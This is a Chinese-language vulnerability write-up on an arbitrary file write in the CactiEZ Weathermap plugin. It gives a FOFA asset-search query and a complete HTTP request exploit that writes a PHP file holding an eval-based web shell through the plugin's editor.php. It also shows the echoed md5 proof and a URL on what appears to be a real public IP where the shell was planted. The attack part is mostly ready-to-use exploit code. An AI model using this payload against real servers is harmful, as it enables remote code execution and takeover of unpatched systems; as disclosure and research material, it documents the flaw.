# CactiEZ weathermap 插件任意文件写入漏洞

## 漏洞描述

CactiEZ 中文版是 Cacti 中文解决方案，整合了 Spine，RRDTool 和美化字体。集成 Thold，Monitor，Syslog，Weathermap，Realtime，Errorimage，Mobile，Aggregate 以及 Apache，Squid，F5，Nginx，MySQL 等模板。

CactiEZ Weathermap 插件存在任意文件写入漏洞。

## 披露时间

```
wooyun-2016-0178509
```

## 漏洞影响

```
CactiEZ Weathermap 插件
```

## 网络测绘

```
app="Cactiez"
```

## 漏洞复现

登录页面

![](images/CactiEZ%20weathermap%20插件任意文件写入漏洞/image-20240904155412309.png)

poc

```
GET /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php%20echo(md5(1));@eval($_POST[0]);?>&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: */*
Cookie: Cacti=xxx
```

```
http://114.242.111.210:8088/plugins/weathermap/configs/test.php
```

回显 md5 值：

```
# echo(md5(1));
c4ca4238a0b923820dcc509a6f75849b
```

![](images/CactiEZ%20weathermap%20插件任意文件写入漏洞/image-20240904154426936.png)
